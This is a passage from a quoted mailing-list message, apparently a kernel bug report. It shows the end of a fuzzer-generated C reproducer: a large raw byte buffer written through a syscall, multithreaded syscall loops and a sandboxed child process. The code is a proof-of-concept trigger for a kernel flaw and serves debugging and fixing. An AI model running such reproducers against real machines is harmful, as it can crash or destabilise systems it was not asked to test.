> >>         "\xa8\x6d\xe9\x70\x69\xc7\xdf\x7a\x22\x9a\x42\x88\xb2\x90\x07"
> >>         "\xd5\x76\xa9\xe8\x2f\x2d\x96\x33\x73\x2d\x25\x84\xbc\x05\xd4"
> >>         "\xf7\x84\x63\x7b\x5a\xce\xe4\xa7\x93\xe8\x6b\xe8\xf1\xe9\xa5"
> >>         "\xc8\xc5\x33\xd7\xa3\x53\x6e\x40\x2d\xcc\x21\x79\x13\x68\x94"
> >>         "\x84\xcd\xe2\x80\x4f\x75\x4d\x3e\x37\x0f\x20\x8b\xf0\x47\x8b"
> >>         "\x60\xb5\x49\x31\x65\x7b\x7d\xca\x82\x54\x68\x16\x5d\xaf\xf6"
> >>         "\x52\x92\x58\xbd\x28\xb1\x37\x4e\xf0\x5d\x9a\xb6\x69\xea\x51"
> >>         "\x7b\x90\x0c\x1e\x5b\x67\x3d\x40\x43\xc5\x0d\x89\x12\xbe\x5f"
> >>         "\x53\xa1\x9c\xd0\x64\x27\xc2\xc2\x18\x8b\x3a\x84\x22\x80\xc7"
> >>         "\x24\xd0\xa3\x38\xcc\x68\xd6\xac\x64\x1f\x4b\xaf\xad\x1e\x16"
> >>         "\x31\x69\xf4\x69\x54\x00\x34\x1b\x5d\x52\x77\x3d\x88\x57\xa0"
> >>         "\x15\x05\x0a\x4f\x08\x38\x0d\x4a\x1f\x2d\x45\xc4\x98\x67\x60"
> >>         "\x1f\x12\x77\x4a\x09\xa4\xd6\xee\xc4\x3f\xf7\xf8\xe5\x2e\xb3"
> >>         "\x5e\x09\x7a\x92\x57\x11\x4c\xa7\x1f\x0f\x1f\x0a\x25\x4f\x65"
> >>         "\x54\xe4\x88\xdb\x9e\x24\xdf\x9e\x9d\xca\x24\xb2\x26\x56\xee"
> >>         "\x1f\x31\xce\xc9\xb1\x9f\xa3\x11\x27\x8f\x5a\x23\xbf\x95\x1b"
> >>         "\x5b\xd7\xdb\xf7\x9d\x9e\x71\xb4\xfc\x9c\x6b\x67\xff\x09\xa1"
> >>         "\x53\x34\xf0\xe9\x4c\x20\x79\x9c\xd1\xc9\x4f\xab\x1c\x53\x87"
> >>         "\xcd\x73\xd7\x3b\xd9\xaa\x37\xfc\x36\x64\x27\x07\xba\x28\x92"
> >>         "\x56\xab\xe1\xc7\x20\xcd\x13\x37\xf2\xd0\x92\x16\x35\xc4\xa0"
> >>         "\xd6\x94\xe6\xd4\x84\x74\x5f\xd3\x5c\x29\xfc\x4c\x95\xba\xc5"
> >>         "\xf6\xe6\xff\xce\x39\x9b\x83\x28\x05\xa7\xfa\x3f\xe9\x4a\xf3"
> >>         "\xe5\xde\xf3\x19\x45\x2a\x26\x4b\xa1\x83\x8b\x67\xfc\x38\x77"
> >>         "\x41\xfa\x61\x6e\xea\xea\x4a\xad\x6d\x62\xdb\x3d\xa1\x99\xf7"
> >>         "\xae\xc8\xee\xee\x05\x8f\x06\x5c\x46\xbe\xd9\xc6\xf6\x46\x5b"
> >>         "\xef\x13\x92\x39\xf4\x4c\x8b\x3a\xcf\x77\x51\x18\xca\xac\x53"
> >>         "\x40\xb7\xdc\xc6\xac\xa2\x0d\x54\xdb\x8a\xe1\xa6\x98\xdf\x4b"
> >>         "\x9d\x1c\x90\x4a\xb2\x8d\xcf\xc6\x78\xe5\x13\xb0\xc7\x48\xf6"
> >>         "\x85\x1d\x8f\xf4\xd8\xd4\x82\x0c\x1a\xc2\x7b\xcd\xdd\x7d\x7b"
> >>         "\x1a\xc8\x3f\x84\xa1\xb1\xc2\x30\x1d\xe6\xfd\x3e\x0b\x3d\x18"
> >>         "\xf7\x75\x21\x85\xb2\x3c\x47\xa6\x57\xf3\x10\x7e\xc8\xa3\x8f"
> >>         "\xa3\xd3\x80\xe0\x27\xd7\xa3\xbb\x7c\x96\xc7\xd9\x18\xce\x53"
> >>         "\x2d\xc4\xee\x57\xa4\x92\x8f\x99\x82\xd8\xdc\xa7\x24\x36\x12"
> >>         "\xec\x36\x4e\xe7\x11\xe1\x73\x5f\xab\x16\x0a\xb5\xb5\x9d\xb2"
> >>         "\xf5\xad\x93\x8e\xf4\xdc\x76\x11\x56\x40\x38\x6f\x98\x2b\x55"
> >>         "\x74\x2e\x55\x2a\x05\x3d\x43\x89\x84\x0e\x32\xc8\xd4\x8d\xc1"
> >>         "\x11\x8b\xec\x0b\x68\xef\x96\xaf\x78\xe8\x8f\x28\x8d\x8f\xd0"
> >>         "\x3a\x62\x76\xb0\x22\xda\xc4\x0f\x19\xe8\x02\x70\xdb\xd5\xb3"
> >>         "\x06\xdb\x59\x95\x3d\x0e\x9b\x82\xf3\x0f\x29\x73\x62\x7d\x9d"
> >>         "\x02\x55\xcd\xf7\xb1\xbb\xa9\x32\x54\xde\x6d\x9c\x97\xa2\x98"
> >>         "\x7c\x7a\xf2\x55\x18\x12\xc2\xb2\x14\x96\xb5\x68\x63\x05\x8a"
> >>         "\x96\x7a\x00\xf3\x8b\x68\x43\x61\x93\x32\xdd\x9b\xf8\x0e\xb1"
> >>         "\xce\xbf\x7b\x6b\xcd\xc3\xe6\x8a\xf2\x82\xb6\x14\xa2\x81\x59"
> >>         "\xde\xb2\x44\xe1\xfd\x38\x01\xba\x80\x63\xde\x23\xe5\x92\x45"
> >>         "\x97\xce\xcc\x53\x20\x71\x4b\x79\x84\x8e\xa3\x51\xd7\x1f\xde"
> >>         "\xa7\xe5\xd6\x8d\x63\x1b\xab\x67\xd7\x01\x2c\xf4\x63\xdd\x39"
> >>         "\x4a\x9c\x5f\x9b\x7a\x3f\xeb\x2a\x66\xdb\xca\x43\x74\xb3\x1c"
> >>         "\xce\xdb\x15\xd0\x31\x2a\xd6\x1d\x41\xcf\x4e\x79\x4d\x3a\x7f"
> >>         "\x4f\x03\x26\x80\x88\xe0\xe4\x06\xde\xe3\x77\xbc\x1a\xd3\x41"
> >>         "\xe1\x2f\xca\x27\xf6\x00\xa7\x4c\xa7\x47\xf3\x48\xff\x9d\x85"
> >>         "\x7d\xee\x9f\xdd\x72\x0d\x6e\xd5\xfc\x84\x03\xd7\xd9\x11\xc2"
> >>         "\x82\x88\x8a\x29\xbf\xa5\x87\x27\xe7\x7d\xae\x8f\x4f\x18\x00"
> >>         "\xd4\xca\xf8\xb9\x46\xfb\xee\x13\xef\xee\x5c\x60\xe4\x0f\x5d"
> >>         "\x5c\x6a\x4d\x6d\x14\x83\xde\x64\x47\xbd\x1b\xdc\x1f\x7e\x70"
> >>         "\xf4\x9d\xe1\x1b\xb1\x3c\x70\xbd\xd3\x1f\x8b\x16\x0d\x6e\xc7"
> >>         "\x2b\x59\xf4\xec\x89\xcd\x9e\x41\x0b\x92\xd9\xca\x87\xa6\x81"
> >>         "\x03\x64\x0e\x2a\x9a\xee\xb0\x99\xe6\x76\x79\x91\xad\x9a\x27"
> >>         "\x5e\x1a\x09\x6a\x55\xd6\x99\x04\xef\x99\x1b\xa1\xfe\xe6\x39"
> >>         "\x69\x6c\xe7\x27\x96\x45\xdd\xe5\x86\x99\xee\xee\x41\xed\x65"
> >>         "\x99\x6a\xb2\x9e\x35\x28\x86\xe1\x14\x25\x28\xb4\xff\xf1\xd3"
> >>         "\xeb\xdf\x43\xe5\xf5\x40\x0b\xa4\x57\xcc\x5f\x77\xf6\x15\xe8"
> >>         "\xfe\xab\x55\x2b\x47\xfe\xa6\xf3\x1f\x01\x88\xb9\xfe\x61\x4b"
> >>         "\xea\x3a\x40\xd6\xb7\x17\x46\x05\x4f\x3e\x93\xc9\xb9\xc9\x9d"
> >>         "\x79\xa3\x6a\x0f\xfb\x0f\x05\xa5\x16\x0c\xd6\xc1\xeb\x76\xa2"
> >>         "\xd1\x40\x14\x88\x3e\xf8\x92\x29\x07\xda\x18\x6c\x6a\xd1\x9f"
> >>         "\xbb\x71\xf5\x95\xd1\x5c\x2c\x21\x3d\x68\x02\x00\x1c\xda\xb4"
> >>         "\x1d\xb1\xd1\x67\xce\xd2\xd3\xc8\x97\xc1\xcd\x8a\x86\x84\x10"
> >>         "\xf6\x5d\x22\x87\xc7\xa9\x72\x93\x1c\x37\x96\x59\xd4\xc3\x0f"
> >>         "\x77\x83\x99\x2d\xb5\xe7\xd3\xf7\x2a\xfd\xca\xd4\x58\x85\xe4"
> >>         "\xf4\xd3\x3e\x50\x66\x07\xa4\xda\x6d\xc7\xab\x89\x2f\x71\xbf"
> >>         "\x6d\xfe\xfd\x13\xd6\x36\xd2\x3d\x71\x10\x98\xa2\x2b\xa3\x07"
> >>         "\x3c\x02\x6e\xdb\x33\xf0\xfc\xb7\x57\x5f\x44\x6e\x94\xbe\x97"
> >>         "\x9c\x14\x38\xce\xb5\xaf\x6f\xdf\x00\x5f\x15\x77\xb1\x1a\xb0"
> >>         "\x8f\x47\xa4\xd2\x7e\x2b\xfe\x75\x04\xed\x29\x1c\x74\x4c\x29"
> >>         "\x32\xbc\x8c\xb8\x1a\xab\xdd\x90\x9c\x44\x27\xda\x53\xf0\xa3"
> >>         "\x04\xdb\x60\xce\xb3\x34\xbf\xc9\x05\xee\x2f\xf5\xd7\x5f\x2a"
> >>         "\x83\xf5\x6b\x32\x41\x74\xe9\xa8\xd1\xc9\xf1\xee\x88\x84\x9d"
> >>         "\xb9\xd6\xf5\xc2\xf8\x42\x6e\x70\x8b\xfd\x91\x36\xff\xec\xc4"
> >>         "\x18\xd9\xd5\x5b\xba\x18\x98\xfb\x1c\x64\x39\x95\xdb\xfb\xf9"
> >>         "\xe9\x24\x12\x71\x0e\xd3\xc9\x4a\x54\x73\xeb\xd0\xbc\x31\xec"
> >>         "\x52\x40\xb8\x87\xd2\xe2\x6e\x33\x92\x38\x5b\x68\x51\x55\x7c"
> >>         "\xcd\x60\x53\xe2\x06\x6f\x99\x92\x8a\x05\x99\xa1\x75\x19\x23"
> >>         "\x7f\xa9\x80\x6c\x38\x23\x39\x0c\xb8\x0e\x94\xd5\x9d\xff\xf7"
> >>         "\x5d\x53\x55\xd0\x13\x77\xee\xb0\x0e\x70\x03\x3b\xa1\x58\xf0"
> >>         "\x9c\x3d\x93\x41\x97\x63\xad\x65\xa1\xa0\x1c\xb8\x32\x18\x04"
> >>         "\x0b\x13\xb4\x47\x35\x42\x66\x6f\xa9\x49\x20\x80\x52\x42\xc1"
> >>         "\xab\xc4\x3c\x6b\xe7\x77\x67\x00\x84\x32\x92\xa5\x3d\xb6\xfe"
> >>         "\xbf\x60\xae\x37\x48\xf1\x6c\x34\xe3\xb9\xab\x9f\xf1\x82\xa6"
> >>         "\x71\x41\x0e\xe6\x4c\x38\x92\x25\x3a\xf8\xbd\xf9\xf0\x7d\xa8"
> >>         "\x09\x87\x7e\xf8\x1d\x42\x1c\x14\x20\xc7\xdf\x4d\x5f\xeb\xbb"
> >>         "\x3b\x06\x8b\xe5\x14\xd5\x53\x33\x9d\x0e\xbc\x72\x6c\x83\x4d"
> >>         "\xad\x9e\xb4\x66\x20\xb5\x95\x01\xb3\x89\x9f\xc3\x92\xb1\x44"
> >>         "\x5b\xca\xd8\xc1\x0c\xa5\xb8\xef\x75\xd6\x4a\xe2\x3f\x16\xed"
> >>         "\x42\xde\xff\x64\xc0\x6f\x2c\x0f\x9f\x0d\x37\x19\x72\x0d\x59"
> >>         "\x1e\x1c\x45\x5f\x14\xea\xa3\x36\x11\xca\xc4\x82\x05\x62\xab"
> >>         "\x5b\xa3\xf4\xd0\xe3\x64\x8a\x23\x9c\x63\x5d\x14\xca\x30\x78"
> >>         "\x0a\x7e\x9d\xe3\x61\x7b\xdd\xbd\x7d\xa7\x26\xb7\x53\xe9\x2e"
> >>         "\xc1\x72\x73\x7b\xd2\xad\x99\x6c\xee\xd3\xb5\xaa\x4a\x85\xd4"
> >>         "\xac\xca\x07\xf4\x3f\x9f\xc1\x3b\x4f\x55\x5b\x29\x7e\x39\x4e"
> >>         "\xd7\xee\x6a\xbb\xa2\x40\x48\xa0\xda\x4c\x30\xc0\x2e\x1f\x83"
> >>         "\x8a\x3e\x4b\x34\xa8\x71\x40\x24\x02\x7c\xf1\xad\x4f\xa0\x7a"
> >>         "\xf5\xcb\x56\xd4\x49\x6b\xb8\x12\x22\x44\xdc\x56\x6f\xa9\x2e"
> >>         "\x0a",
> >>         4096));
> >>     r[54] =3D execute_syscall(__NR_write, r[2], 0x209c3000ul, 0x1000ul=
, 0,
> >>                             0, 0, 0, 0, 0);
> >>     break;
> >>   }
> >>   return 0;
> >> }
> >>
> >> void loop()
> >> {
> >>   long i;
> >>   pthread_t th[20];
> >>
> >>   memset(r, -1, sizeof(r));
> >>   srand(getpid());
> >>   for (i =3D 0; i < 10; i++) {
> >>     pthread_create(&th[i], 0, thr, (void*)i);
> >>     usleep(10000);
> >>   }
> >>   usleep(100000);
> >> }
> >>
> >> int main()
> >> {
> >>   setup_main_process();
> >>   int pid =3D do_sandbox_setuid(0, false);
> >>   int status =3D 0;
> >>   while (waitpid(pid, &status, __WALL) !=3D pid) {
> >>   }
> >>   return 0;
> >> }
> >>
> >
